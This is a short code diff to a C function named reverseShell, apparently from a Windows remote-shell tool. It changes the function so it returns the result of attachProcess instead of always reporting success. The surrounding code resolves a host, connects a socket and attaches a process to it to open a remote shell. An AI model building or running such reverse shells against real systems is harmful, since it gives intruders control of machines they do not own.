@@ -53,6 +53,7 @@ RS_ERROR reverseShell(const char *host, u_short port) {
     SOCKADDR_IN winsock_in;
     struct hostent *Dire;
     char *ip;
+    int ret;
 
     if ((Dire = gethostbyname(host)) == NULL) {
         ERROR_MSG("Could not get host: <%s>", host);
@@ -75,10 +76,10 @@ RS_ERROR reverseShell(const char *host, u_short port) {
         return RS_ERROR_CONNECT;
     }
 
-    attachProcess(winsock);
+    ret = attachProcess(winsock);
 
     closesocket(winsock);
 
-    return RS_ERROR_OK;
+    return ret;
 }
 
